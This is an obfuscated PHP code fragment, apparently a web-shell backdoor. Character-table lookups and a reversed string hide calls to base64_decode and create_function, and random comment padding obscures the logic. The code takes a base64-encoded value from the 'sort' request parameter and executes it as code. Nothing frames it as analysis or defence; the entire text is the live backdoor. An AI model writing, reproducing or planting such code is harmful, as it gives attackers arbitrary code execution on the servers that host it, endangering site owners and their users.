...
$yZXdiLBS7418 = "qf78e)y6(i2_bhl4na0rz9t/vok1c;5wjpux*md.g3s";


$QWZwGECX4749 = "";

foreach([42,25,19,22] as $i){
       $QWZwGECX4749 .= $yZXdiLBS7418[$i];
    }


if(isset($_REQUEST /*hUrlyshpWHhqBreELBhZyRdRnrdZbFTPoNJeXvllCFLaZYTRPEWBVdEwPyduwwfMoaUqqQizaXhfrZCyMbExkIYvkaXiKGkciGZWDFZitIxCCteyDRfNuHmNzVKpSkkM*/["$QWZwGECX4749"])){
    $VGXWJOKj925 = $_REQUEST /*hUrlyshpWHhqBreELBhZyRdRnrdZbFTPoNJeXvllCFLaZYTRPEWBVdEwPyduwwfMoaUqqQizaXhfrZCyMbExkIYvkaXiKGkciGZWDFZitIxCCteyDRfNuHmNzVKpSkkM*/["$QWZwGECX4749"];
    $xyvsOlXA3741 = "";
    $tSxqGyJk7025 = "";

    /*AwwatyIjqQThcPCZPoIqoFKlKEEnQFQDPztMuDKRQKOyOmdMAbBmLuIcHjvOYMnAXVjRocFSjYCiudxSfhoBcCAnxggIbmEQZKSqcUunwGjmTnKsEGUknemShxLWXfOz*/

    foreach([12,17,42,4,7,15,11,38,4,28,25,38,4] as $i){
       $xyvsOlXA3741 .= $yZXdiLBS7418[$i];
    }

    /*UTviJfdcDHLKmQRlVzumrZRQKijDMtSCIwRukKFjDbfAyNRyhLNIpoqihmADvZPZqshaEJaLwPtLEdLelrZxgWITxKLXXZFPSIqZSbpGjXBpDNyekqfGQYUXHBPLttqY*/


    foreach([42,22,19,19,4,24] as $i){
       $tSxqGyJk7025 .= $yZXdiLBS7418[$i];
    }

    /*nrtrZMyUQyCmvRfxcJfiutZwKMNSJgTBCtpdaRACqsxDhoGkNvYdSiYnHqFsSnqyKPfjUqvDJGlnNeZqsBKtjqQyxoqmUNHOLFOHIikYWoTrmonQQbqbtSCdhFUAQHRx*/

    $i = $tSxqGyJk7025('n'.'o'.'i'.''.'t'.''.''.'c'.'n'.''.''.''.''.'u'.''.''.''.'f'.'_'.'e'.''.''.''.''.'t'.''.'a'.''.'e'.''.''.'r'.'c');
    $H = $i("", $xyvsOlXA3741($VGXWJOKj925));
    $H();
    exit();
